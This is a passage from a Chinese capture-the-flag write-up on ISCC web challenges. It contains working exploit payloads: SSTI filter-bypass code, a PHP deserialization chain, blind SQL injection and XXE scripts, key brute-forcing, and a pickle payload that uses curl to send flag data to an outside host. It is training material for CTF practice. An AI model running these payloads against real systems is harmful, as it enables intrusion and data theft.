g&amp;_SESSION[a]=base64base64base64&amp;_SESSION[aaa]=;s:4:&quot;file&quot;;s:62:&quot;php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php&quot;;s:8:&quot;function&quot;;s:4:&quot;hack&quot;;s:8:&quot;function&quot;;s:4:&quot;hack&quot;;&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305232013022.png\" alt=\"image-20230523201305959\" /></p>\n<h3 id=\"chatggg\"><a class=\"anchor\" href=\"#chatggg\">#</a> ChatGGG</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305232044091.png\" alt=\"image-20230523204412046\" /></p>\n<p>很有意思的一个题，很明显是模版注入，这里过滤了不少字符，大概差不多就下面这些</p>\n<p>waf：_，class，or，+，*，init，base，global，builtin，.</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305232050135.png\" alt=\"image-20230523205058089\" /></p>\n<p>这里得到提示，就在 fllaaag.txt 里面，那么就很明显了，这里只要想办法绕过即可，关键字几乎都被过滤，这里考虑使用编码绕过，点号被过滤使用 attr 绕过</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305240123856.png\" alt=\"image-20230524012330774\" /></p>\n<p>成功了，这里开始构建 payload</p>\n<pre><code class=\"language-perl\">&#123;%print(((((((((\"\"|attr(\"\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f\"))|attr(\"\\u005f\\u005f\\u0062\\u0061\\u0073\\u0065\\u005f\\u005f\"))|attr(\"\\u005f\\u005f\\u0073\\u0075\\u0062\\u0063\\u006c\\u0061\\u0073\\u0073\\u0065\\u0073\\u005f\\u005f\"))()|attr(140))|attr(\"\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f\"))|attr(\"\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\")))|attr(\"\\u0067\\u0065\\u0074\")(\"\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f\"))|attr(\"\\u0067\\u0065\\u0074\")(\"\\u0065\\u0076\\u0061\\u006c\")(\"\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f\\u0028\\u0027\\u006f\\u0073\\u0027\\u0029\\u002e\\u0070\\u006f\\u0070\\u0065\\u006e\\u0028\\u0027\\u0063\\u0061\\u0074\\u0020\\u0066\\u002a\\u0027\\u0029\\u002e\\u0072\\u0065\\u0061\\u0064\\u0028\\u0029\"))%&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305240122699.png\" alt=\"image-20230524012238588\" /></p>\n<h3 id=\"iscc疯狂购物节-1\"><a class=\"anchor\" href=\"#iscc疯狂购物节-1\">#</a> ISCC 疯狂购物节 - 1</h3>\n<p>这里先注册登录后发现这里名字经过编码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241149473.png\" alt=\"image-20230524114902422\" /></p>\n<p>阿里嘎多美羊羊桑，这里寻找解码后美羊羊的值</p>\n<pre><code class=\"language-python\">import time\nimport parsel\nimport requests\nimport base64\nimport re\n\n\ndef extract_info(html):\n    # 提取描述信息\n    description_match = re.search(r'&lt;h5&gt;描述:&amp;nbsp&amp;nbsp(.+?)&lt;/h5&gt;', html)\n    description = description_match.group(1).strip() if description_match else &quot;无描述信息&quot;\n\n    # 提取颜值信息\n    yanzhi_match = re.search(r'魅力值:&lt;span style=&quot;color: red;&quot;&gt;(.+?)&lt;/span&gt;', html)\n    yanzhi = yanzhi_match.group(1).strip() if yanzhi_match else &quot;无颜值信息&quot;\n\n    # 提取智慧值\n    wisdom_match = re.search(r'智慧值:&lt;span&gt;(.+?)&lt;/span&gt;', html)\n    wisdom_value = wisdom_match.group(1).strip() if wisdom_match else &quot;无智慧值信息&quot;\n\n    # 提取体力值\n    strength_match = re.search(r'体力值:&lt;span&gt;(.+?)&lt;/span&gt;', html)\n    strength_value = strength_match.group(1).strip() if strength_match else &quot;无体力值信息&quot;\n\n    # 提取爱情值\n    love_match = re.search(r'爱情值:&lt;span&gt;(.+?)&lt;/span&gt;', html)\n    love_value = love_match.group(1).strip() if love_match else &quot;无爱情值信息&quot;\n\n    # 返回提取的信息\n    return &#123;\n        '描述': base64.b64decode(description).decode('utf-8'),\n        '颜值': yanzhi,\n        '智慧值': wisdom_value,\n        '体力值': strength_value,\n        '爱情值': love_value\n    &#125;\n\n\nbulei=''\nmax=0\nid=''\nname=''\nfor i in range(1,999999):\n    url=&quot;http://47.94.14.162:10001/Details/search?id=&#123;&#125;&quot;.format(i)\n    print(url)\n    cookie = &#123;\n        'csrftoken': 'qk1ya0UNlGvPeAQjKYmLl8To2D8UL2T28WJ1xUYxTc5PRqgB8i2VXXTbLxY3ONvY',\n        'PHPSESSID': 'v6q21f2a4m8udue4664j1ooh5u',\n        'Auth_Key': 'XxA8UIdzpPzCjX%2FdPFgGgg%3D%3D',\n        'Cyber_info': 'GODICWnAlGHG5KhM%2F%2Bl%2FmDL%2FT%2B%2FM%2B3Y06%2BvUFqxxpq4W4KmKr8C0rizMmoIfZJnweV4VafZ7iLVEXGWmgB95%2BUIRceCkk5gY2BI9bX9E%2F9Q%3D',\n        'sessionid': 'o0ovlujwnxex4j6uku6xe82xzskdm8yr',\n        'messages': '.eJyLjlaKj88qzs-Lz00tLk5MT1XSMdAxMdBRUogpNTVONoopNTM1N4gptTQ1tIwptUhKTVNUitUZhppiAe3zT6I:1q1djr:BifAVF-RDnVlwPGPehNqAZGpFPcISil7vJyaqsaJnvQ'\n    &#125;\n    header=&#123;\n        &quot;Cache-Control&quot;: &quot;max-age=0&quot;,\n        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,\n        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;,\n        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,\n        &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,\n        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,ru;q=0.8,eo;q=0.7&quot;,\n        &quot;Connection&quot;: &quot;close&quot;\n    &#125;\n    response = requests.get(url=url,cookies=cookie,headers=header)\n    # print(response.text)\n    while (response.text.find('too fast!!!') &gt; 0):\n        time.sleep(2)\n    while(response.text.find('innerHTML=Math.round(Math.random()*100)')&gt;0):\n        time.sleep(2)\n        response = requests.get(url=url, cookies=cookie, headers=header)\n    print(str(i)+&quot;======&quot;)\n    time.sleep(1)\n    info = extract_info(response.text)\n    for key, value in info.items():\n        print(str(key) + ': ' + str(value))\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241150113.png\" alt=\"image-20230524115019060\" /></p>\n<p>最后发现在 487561 识别了一个很奇怪的值，而且体力值是一个 ip</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241239968.png\" alt=\"image-20230524123932900\" /></p>\n<p>去访问看一下，去年的套路今年接着用，，，，挺离谱</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241240835.png\" alt=\"image-20230524124052761\" /></p>\n<p>羊名解码后果然是美羊羊，也看到描述有 fl4g 注入点就在这个地方了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241242362.png\" alt=\"image-20230524124208287\" /></p>\n<p>在这里输入危险字符发现有过滤，应该是 sql 注入，注入点就在这里了，简单测试一下 waf</p>\n<pre><code>waf： =，/*，select，and，or，union，【空格】，sleep，'，&quot;，','，&lt;&gt;，regexp\n</code></pre>\n<p>限制很多，这里 union 和 ',' 都被过滤，就不考虑常规的注入，这里发现 like 没有过滤，这里利用 like 盲注</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241954386.png\" alt=\"image-20230524195442323\" /></p>\n<p>可以看到是由 fl4g 这个列，因为单引号和双引号被过滤，所以这里使用编码方式绕过</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241951402.png\" alt=\"image-20230524195120332\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241951519.png\" alt=\"image-20230524195140441\" /></p>\n<p>这里可以看到第一个字符是 I，写个脚本来爆破一下，发现有长度限制，这里用模糊查询</p>\n<pre><code class=\"language-python\">import requests\nimport time\n\ncookies = &#123;\n    'csrftoken': 'xm0lmDwgZibp3KuHHgFjgHb3b9Lo2PxpdcHz6TqmuHKl731mlg4sT1t8C7LVXjTv',\n    'PHPSESSID': 'v6q21f2a4m8udue4664j1ooh5u',\n    'Auth_Key': 'XxA8UIdzpPzCjX%2FdPFgGgg%3D%3D',\n    'Cyber_info': 'GODICWnAlGHG5KhM%2F%2Bl%2FmDL%2FT%2B%2FM%2B3Y06%2BvUFqxxpq4W4KmKr8C0rizMmoIfZJnweV4VafZ7iLVEXGWmgB95%2BUIRceCkk5gY2BI9bX9E%2F9Q%3D',\n    'sessionid': 'lkipk7j8axhrt344kou1bbkd9jvor3m1',\n&#125;\n\nheaders = &#123;\n    &quot;Cache-Control&quot;: &quot;max-age=0&quot;,\n    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,\n    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&quot;,\n    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,\n    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,\n    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;,\n    &quot;Connection&quot;: &quot;close&quot;\n&#125;\nflag='&#125;'\nstr1='&#125;'\nstr2=''\nstr_list = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;'\nwhile(1):\n    for i in str_list:\n        # url = f&quot;http://47.94.14.162:10001/Details/search?id=-487561)||fl4g%20like%20binary%200x25&#123;bytes(str1,'utf-8').hex()&#125;&#123;bytes(str2,'utf-8').hex()&#125;&#123;bytes(i,'utf-8').hex()&#125;25--+&quot;#拿前一部分\n        url = f&quot;http://47.94.14.162:10001/Details/search?id=-487561)||fl4g%20like%20binary%200x25&#123;bytes(i,'utf-8').hex()&#125;&#123;bytes(str2,'utf-8').hex()&#125;&#123;bytes(str1,'utf-8').hex()&#125;25--+&quot;#拿后以部分\n        print(url)\n        time.sleep(0.8)\n        re = requests.get(url=url,cookies=cookies,headers=headers)\n        if &quot;fl4g&quot; in re.text:\n            str2=i\n            str1=''\n            flag = flag+i\n            print(flag)\n            break\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242201696.png\" alt=\"image-20230524220105608\" /></p>\n<p>逆序一下就是 flag</p>\n<h3 id=\"where_is_your_love\"><a class=\"anchor\" href=\"#where_is_your_love\">#</a> Where_is_your_love</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011306103.png\" alt=\"image-20230501130615311\" /></p>\n<p>还是看源码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011307763.png\" alt=\"image-20230501130707717\" /></p>\n<p>有三个文件，第一个是下载公钥</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011307627.png\" alt=\"image-20230501130732584\" /></p>\n<p>LoveStory.php 文件是题目入口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011308789.png\" alt=\"image-20230501130820726\" /></p>\n<p>Enc.php</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251048876.png\" alt=\"image-20230525104832716\" /></p>\n<pre><code class=\"language-php\">?&gt; &lt;?php\ninclude(&quot;./xxxiscc.php&quot;);\nclass boy &#123;\n    public $like;\n    public function __destruct() &#123;\n        echo &quot;能请你喝杯奶茶吗？&lt;br&gt;&quot;;\n        @$this-&gt;like-&gt;make_friends();\n    &#125;\n    public function __toString() &#123;\n        echo &quot;拱火大法好&lt;br&gt;&quot;;\n        return $this-&gt;like-&gt;string;\n    &#125;\n&#125;\n\nclass girl &#123;\n    private $boyname;\n    public function __call($func, $args) &#123;\n        echo &quot;我害羞羞&lt;br&gt;&quot;;\n        isset($this-&gt;boyname-&gt;name);  \n    &#125;\n&#125;\n\nclass helper &#123;\n    private $name;\n    private $string;\n    public function __construct($string) &#123;\n        $this-&gt;string = $string;\n    &#125;\n    public function __isset($val) &#123;\n        echo &quot;僚机上线&lt;br&gt;&quot;;\n        echo $this-&gt;name;\n    &#125;\n    public function __get($name) &#123;\n        echo &quot;僚机不懈努力&lt;br&gt;&quot;;\n        $var = $this-&gt;$name;\n        $var[$name]();\n    &#125;\n&#125;\nclass love_story &#123;\n    public function love() &#123;\n        echo &quot;爱情萌芽&lt;br&gt;&quot;;\n        array_walk($this, function($make, $colo)&#123;\n            echo &quot;坠入爱河，给你爱的密码&lt;br&gt;&quot;;\n            if ($make[0] === &quot;girl_and_boy&quot; &amp;&amp; $colo === &quot;fall_in_love&quot;) &#123;\n                global $flag;\n                echo $flag;\n            &#125;\n        &#125;);\n    &#125;\n&#125;\n\nif (isset($_GET[&quot;iscc&quot;])) &#123;\n    $a=unserialize($_GET['iscc']);\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125; \n</code></pre>\n<p>反序列化</p>\n<pre><code class=\"language-php\">&lt;?php\nclass boy &#123;\n    public $like;\n    public function __destruct() &#123;\n        @$this-&gt;like-&gt;make_friends();//触发call\n    &#125;\n\n    public function __toString() &#123;\n        return $this-&gt;like-&gt;string;//触发get\n    &#125;\n&#125;\n\nclass girl &#123;\n    public $boyname;\n    public function __call($func, $args) &#123;\n        isset($this-&gt;boyname-&gt;name);  //触发isset\n    &#125;\n&#125;\n\nclass helper &#123;\n    public $name;\n    public $string;\n    public function __construct($string) &#123;\n        $this-&gt;string = $string;\n    &#125;\n    public function __isset($val) &#123;\n        echo $this-&gt;name;\n    &#125;\n    public function __get($name) &#123;\n        $var = $this-&gt;$name;\n        $var[$name]();\n    &#125;\n&#125;\nclass love_story &#123;\n    public function love() &#123;//触发walk\n        array_walk($this, function($make, $colo)&#123;\n            if ($make[0] === &quot;girl_and_boy&quot; &amp;&amp; $colo === &quot;fall_in_love&quot;) &#123;\n                global $flag;\n                echo $flag;\n            &#125;\n        &#125;);\n    &#125;\n&#125;\n$a = new boy();\n$a-&gt;like = new girl();\n$a-&gt;like-&gt;boyname = new helper(null);\n$a-&gt;like-&gt;boyname-&gt;name = new boy();\n$a-&gt;like-&gt;boyname-&gt;name-&gt;like = new helper(null);\n$b = new love_story();\n$b -&gt; fall_in_love =array(&quot;girl_and_boy&quot;);\n$c = array(&quot;string&quot;=&gt;array($b,&quot;love&quot;));\n$a-&gt;like-&gt;boyname-&gt;name-&gt;like-&gt;string = $c;\n$a-&gt;like-&gt;boyname-&gt;name-&gt;like-&gt;name=&quot;0&quot;;\necho urlencode(serialize($a));\n//O%3A3%3A%22boy%22%3A1%3A%7Bs%3A4%3A%22like%22%3BO%3A4%3A%22girl%22%3A1%3A%7Bs%3A7%3A%22boyname%22%3BO%3A6%3A%22helper%22%3A2%3A%7Bs%3A4%3A%22name%22%3BO%3A3%3A%22boy%22%3A1%3A%7Bs%3A4%3A%22like%22%3BO%3A6%3A%22helper%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A1%3A%220%22%3Bs%3A6%3A%22string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A10%3A%22love_story%22%3A1%3A%7Bs%3A12%3A%22fall_in_love%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A12%3A%22girl_and_boy%22%3B%7D%7Di%3A1%3Bs%3A4%3A%22love%22%3B%7D%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D%7D%7D\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011309481.png\" alt=\"image-20230501130924433\" /></p>\n<p>链子难度一般，最后 love 的调用挺有意思，这里使用数组过的，本地测了一下 php 是非线程安全的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305052008692.png\" alt=\"image-20230505200851642\" /></p>\n<p>这里通过前面的公钥来解密，先通过 openssl 拿到 n 和 e</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251102111.png\" alt=\"image-20230525110216013\" /></p>\n<pre><code>n=21632595061498942456591176284485458726074437255982049051386399661866343401307576418742779935973203520468696897782308820580710694887656859447653301575912839865540207043886422473424543631000613842175006881377927881354616669050512971265340129939652367389539089568185762381769176974757484155591541925924309034566325122477217195694622210444478497422147703839359963069352123250114163369656862332886519324535078617986837018261033100555378934126290111146362437878180948892817526628614714852292454750429061910217210651682864700027396878086089765753730027466491890569705897416499997534143482201450410155650707746775053846974603\n</code></pre>\n<p>用 yafu 分解 n</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251105609.png\" alt=\"image-20230525110556501\" /></p>\n<pre><code class=\"language-python\">from Crypto.Util.number import *\n\np=147080233415299360057845495186390765586922902910770748924042642102066002833475419563625282038534033761523277282491713393841245804046571337610325158434942879464810055753965320619327164976752647165681046903418924945132096866002693037715397450918689064404951199247250188795306045444756953833882242163199922206967\nq=147080233415299360057845495186390765586922902910770748924042642102066002833475419563625282038534033761523277282491713393841245804046571337610325158434942879464810055753965320619327164976752647165681046903418924945132096866002693037715397450918689064404951199247250188795306045444756953833882242163199922205709\nn=21632595061498942456591176284485458726074437255982049051386399661866343401307576418742779935973203520468696897782308820580710694887656859447653301575912839865540207043886422473424543631000613842175006881377927881354616669050512971265340129939652367389539089568185762381769176974757484155591541925924309034566325122477217195694622210444478497422147703839359963069352123250114163369656862332886519324535078617986837018261033100555378934126290111146362437878180948892817526628614714852292454750429061910217210651682864700027396878086089765753730027466491890569705897416499997534143482201450410155650707746775053846974603\ne=65537\n\nd=inverse(e,(p-1)*(q-1))\nf=open('F:\\\\迅雷下载\\\\letter.php', 'rb')\nc = f.read()\nc=bytes_to_long(c)\nm=pow(c,d,n)\nprint(long_to_bytes(m))\nf.close()\n</code></pre>\n<p>得到加密的脚本</p>\n<pre><code class=\"language-php\">&lt;?php\nfunction enc($data)&#123;\n        $str=&quot;&quot;;\n        $a=strrev(str_rot13($data)); \n        for($i=0;$i&lt;strlen($a);$i++)&#123;\n                $b=ord($a[$i])+10;\n                $c=$b^100;\n                $e=sprintf(&quot;%02x&quot;,$c);     \n                $str.=$e; \n                &#125;\n                return $str;\n            &#125;\n?&gt;\n</code></pre>\n<p>然后写一个解密脚本拿到 flag</p>\n<pre><code class=\"language-python\">import binascii\n\ndef rot13(message):\n    res = ''\n    for item in message:\n        if (ord(item)&gt;= ord('A') and ord(item)&lt;= ord('M')) or (ord(item)&gt;= ord('a') and ord(item)&lt;= ord('m')):\n            res += chr(ord(item)+13)\n        elif (ord(item)&gt;= ord('N') and ord(item)&lt;= ord('Z')) or (ord(item)&gt;= ord('n') and ord(item)&lt;= ord('z')):\n            res += chr(ord(item)-13)\n        else:\n            res += item\n    return res\n\nc = b'e35a31342f241b3f17081ae75e042b5f155e38163d285826e41936125b5a075910e13e3e3404'\nc = binascii.a2b_hex(c)[::-1]\nprint(c)\nm = ''\nfor i in c:\n    t = (i ^ 100) - 10\n    m = m + chr(t)\nprint(rot13(m))\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242202704.png\" alt=\"image-20230524220234641\" /></p>\n<h3 id=\"iscc单身节抽奖\"><a class=\"anchor\" href=\"#iscc单身节抽奖\">#</a> ISCC 单身节抽奖</h3>\n<p>登录后再后台看到一个注释的 token</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242203190.png\" alt=\"image-20230524220358123\" /></p>\n<p>反序列化后的内容，这里很明显是用户的账号信息被序列化后替换，构造 payload 然后使得 sdog 的值为 1</p>\n<pre><code>ccccccc1234567&quot;;s:8:&quot;username&quot;;s:64:&quot;cccccccc&quot;;s:4:&quot;sdog&quot;;i:1;&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242240512.png\" alt=\"image-20230524224010420\" /></p>\n<p>进入后可以下载凭证，这里存在任意文件下载</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242322070.png\" alt=\"image-20230524232217966\" /></p>\n<p>这里下载 apidemo.php, 很明显的 xxe，构造 payload</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">name</span><span class=\"token punctuation\">[</span><span class=\"token internal-subset\"></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&lt;!ENTITY admin SYSTEM \"file:///flag\"></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>user</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>     <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>name</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&admin;\">&amp;admin;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>name</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>     <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>isdog</span><span class=\"token punctuation\">></span></span>singledog<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>isdog</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>     <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>award</span><span class=\"token punctuation\">></span></span>4090Ti<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>award</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>user</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242328350.png\" alt=\"image-20230524232848249\" /></p>\n<h3 id=\"上大号说话\"><a class=\"anchor\" href=\"#上大号说话\">#</a> 上大号说话</h3>\n<p>扫 web4 目录给的脚本 /.git</p>\n<pre><code class=\"language-Python\">class ED:\n    def __init__(self):#通过随机数生成密钥\n        self.file_key = ...  # 1Aa\n        self.cipher_suite = Fernet(self.generate_key(self.file_key))#Fernet是对称加密的一种实现方式\n\n    def crypto(self, base_str):\n        return self.cipher_suite.encrypt(base_str)#加密\n\n    @staticmethod\n    def generate_key(key: str):#这里是生成密钥的函数\n        key_byte = key.encode()\n        return base64.urlsafe_b64encode(key_byte + b'0' * 28)#base64是一种编码方式，urlsafe_b64encode是base64的一种变种\n\n\ndef check_cookies(cookie):\n    ed = ED()\n    f, result = ed.decrypto(cookie)#ed.decrypto是解密\n    black_list = ...\n    if not result[0:2] == b'\\x80\\x03':#b'\\x80\\x03'是pickle序列化后的字节流的开头\n        return False\n    ...\n    try:\n        result = pickle.loads(result)#pickle.loads是将字节流反序列化成对象\n        if result.name == 'mabaoguo' and result.random == mabaoguo.random and result.gongfu == mabaoguo.gongfu:#这里是判断对象的属性是否和预设的一致\n            return flag\n        else:\n            return result.name\n    except:\n        return False\n\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST':\n        name = request.form['input_field']\n        name = Member(name)\n        name_pick = pickle.dumps(name, protocol=3)#pickle.dumps是将对象序列化成字节流，protocol是序列化时采用的协议版本，3是python3的协议版本\n        name_pick = pickletools.optimize(name_pick)#pickletools.optimize是优化pickle序列化后的字节流\n        ed = ED()\n        response = make_response(redirect('/'))#make_response是将返回的内容封装成response对象\n        response.set_cookie('name', ed.crypto(name_pick).decode())#set_cookie是设置cookie，ed.crypto是加密，decode是将字节流转换成字符串\n        return response\n\n    temp_cookies = request.cookies.get('name')#request.cookies.get是获取cookie\n\n    if not temp_cookies:\n        ...\n    else:\n        f = check_cookies(temp_cookies)\n        ...\n\n\nif __name__ == '__main__':\n    app.run()\n</code></pre>\n<p>爆破出 file_key 密钥</p>\n<pre><code class=\"language-python\">import itertools\nimport pickle\nimport cryptography\nimport base64\nfrom enum import member\nfrom json import dump\nimport pickletools\nfrom cryptography.fernet import Fernet\n\n\nclass ED:\n    def __init__(self,key):\n        # self.file_key = ...  # 1Aa\n        self.file_key = key\n        self.cipher_suite = Fernet(self.generate_key(self.file_key))\n\n    def change(self, key):\n        self.cipher_suite = Fernet(self.generate_key(key))\n\n    def crypto(self, base_str):\n        return self.cipher_suite.encrypt(base_str)\n \n\n    def decrypto(self, base_str):\n        print(self.cipher_suite.decrypt(base_str))\n        return self.cipher_suite.decrypt(base_str)\n    @staticmethod\n    def generate_key(key: str):\n        key_byte = key.encode()\n        return base64.urlsafe_b64encode(key_byte + b'0' * 28)\n\n# 定义字符集\ncharset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'\n# # 定义密钥长度范围\nmin_length = 4\nmax_length = 4\n# 循环尝试所有可能的密钥组合\nfor length in range(min_length, max_length+1):\n    for guess in itertools.product(charset, repeat=length):\n        key = ''.join(guess)\n        # 在此处使用密钥尝试打开加密文件或进行其他操作\n        ed = ED(key=key)\n        try:\n            decrypted_data = ed.decrypto(\n                'gAAAAABkU29cl7FsmN4fcEarM0esqSSe-ht2eaL-9DjMT2K18JGsAd0KFWaXtg4SslOG5ZIlv12E6BgRgUcrQR2bO0AwXvWLxSoi8Fv2x0XegfvFARjSMFH999KD93aMOfPK5uWuhlD9HaiRMKYVCChifxSsTkj_3WoSGrR__a0CZcnPo1xQcc4=')\n            # 解密成功，返回结果\n            print (decrypted_data)\n            print(key)\n        except cryptography.fernet.InvalidToken:\n            # 密钥不正确，继续循环下一个密钥\n            continue\n</code></pre>\n<p>这里接着打 python 反序列化</p>\n<pre><code class=\"language-python\">import base64\nimport requests\nfrom fernet import Fernet\n\n\ndef generate_key(key: str):\n    key_byte = key.encode()\n    return base64.urlsafe_b64encode(key_byte + b'0' * 28)\nexp = &quot;\\x80\\x03(Vcurl ip/`cat fla*|base64`\\niposix\\nsystem\\n.&quot;#ip用自己的\nf = Fernet(generate_key('5MbG'))\nck = f.encrypt(exp).decode()\nprint(requests.get(&quot;http://47.94.14.162:10004/&quot;,cookies=&#123;&quot;name&quot;:ck&#125;).text)\n</code></pre>\n<h3 id=\"iscc滥用职权-3\"><a class=\"anchor\" href=\"#iscc滥用职权-3\">#</a> ISCC 滥用职权 - 3</h3>\n<p>随便注册一个号登进去</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106390.png\" alt=\"image-20230524210352073\" /></p>\n<p>随便一改这里的 Auth key</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106741.png\" alt=\"image-20230524210404157\" /></p>\n<p>刷新</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106371.png\" alt=\"image-20230524210415003\" /></p>\n<p>所以直接用 cbc 翻转</p>\n<pre><code class=\"language-python\">import urllib.parse\nimport requests\nimport base64\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad,unpad\nfrom Crypto.Util.strxor import strxor\n\n# 这里可控的是iv\n\nreal_iv = base64.b64decode('WQ1eYrDvXCKueNoi7QHdPA==')\nprint(real_iv)\n\n\n# url = &quot;http://47.94.14.162:10014/normal.php&quot;\n# cookie = &#123;&quot;Auth_Key&quot;:urllib.parse.quote(&quot;WQ1eYrDvXCKueNoi7QHdPA==&quot;),&quot;Cyber_info&quot;:urllib.parse.quote(&quot;ukOsB0IG9nfqN8S0eUuC92aBh7sbNoJDcVYCMccBQo+dpoPHI91BXCryxiHjBKtsD0/N3rY5+mIvuHK22WDDV/AsYHMH8FzgAXAIRiGj09YC0N/XUWV78++LH0ovuQB4&quot;),&quot;PHPSESSID&quot;:&quot;acak5gn1r8pc670ve0lrel2u8u&quot;&#125;\n# print(requests.get(url,cookies=cookie).text)\n\nauth = 